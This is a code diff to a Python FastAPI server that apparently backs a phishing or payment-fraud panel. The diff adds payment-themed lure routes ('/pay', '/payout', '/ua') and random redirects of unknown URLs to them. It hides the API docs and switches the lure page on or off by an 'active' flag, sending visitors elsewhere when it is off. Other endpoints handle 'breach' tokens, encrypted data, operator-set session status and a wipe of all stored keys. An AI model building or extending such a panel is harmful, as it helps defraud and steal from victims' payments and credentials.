@@ -1,3 +1,4 @@
+from random import choice
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.responses import RedirectResponse, JSONResponse, HTMLResponse
 from starlette.exceptions import HTTPException as StarletteHTTPException
@@ -15,8 +16,7 @@ from validators import validate_tokens
 from utils import generate_token, generate_crypt_key, decrypt_data
 from config import redirect_url
 
-# app = FastAPI(redoc_url=None, docs_url=None)
-app = FastAPI()
+app = FastAPI(redoc_url=None, docs_url=None)
 app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="templates")
 
@@ -27,10 +27,24 @@ async def startup():
     logger.info("Server started")
 
 
-# @app.exception_handler(StarletteHTTPException)
-# async def http_exception_handler(request: Request, exc: StarletteHTTPException):
-#     logger.warning(f"{request.url}: \n Wrong url attempt! {request.client}. \n {exc}")
-#     return RedirectResponse("/")
+sub = ["/ua", "/payment", "/pay", "/payout"]
+
+@app.exception_handler(404)
+async def not_found_exception_handler(request: Request, exc: HTTPException):
+    return RedirectResponse(choice(sub))
+
+
+@app.get("/ua")
+@app.get("/payment")
+@app.get("/pay")
+@app.get("/payout")
+async def index(request: Request):
+    if active:
+        logger.debug(f"{request.url}: \n Visited! {request.client}.")
+        return templates.TemplateResponse("index.html", {"request": request})
+    else:
+        return RedirectResponse(redirect_url)
+
 
 
 @app.post("/connect", response_model=ConnectResponseModel)
@@ -121,7 +135,6 @@ async def activate(breach_token: str, activate_request: ActivateRequestModel, re
     }
 
     validate_tokens(tokens=tokens, request=request)
-
     keys = redis_cli.keys("*")
     if keys:
         redis_cli.delete(*keys)
@@ -131,14 +144,6 @@ async def activate(breach_token: str, activate_request: ActivateRequestModel, re
 
     return ActivateResponseModel(deleted_keys=keys, active=active)
 
-
-@app.get("/")
-async def index(request: Request):
-    if active:
-        logger.debug(f"{request.url}: \n Visited! {request.client}.")
-        return templates.TemplateResponse("index.html", {"request": request})
-    else:
-        return RedirectResponse(redirect_url)
 
 @app.post("/get", response_model=GetResponseModel)
 async def get(breach_token: str, get_request: GetRequestModel, request: Request):
@@ -201,7 +206,7 @@ async def set_status(breach_token: str, set_request: SetRequestModel, request: R
         logger.warning(f"{request.url}: \n Wrong session status! {request.client}.")
         raise HTTPException(404)
     
-    logger.warning(status)
+    logger.info(status)
 
     tokens = {
         "breach": breach_token,
@@ -239,4 +244,4 @@ async def get_status(breach_token: str, get_status_request: GetStatusRequestMode
     
     return GetStatusResponseModel(UW40olHWnbCnN1qFeGoSJqh3yMQNCET6xb2ARROFR10=status_code)
 
-# uvicorn main:app --host 127.0.0.1 --port 8000
+
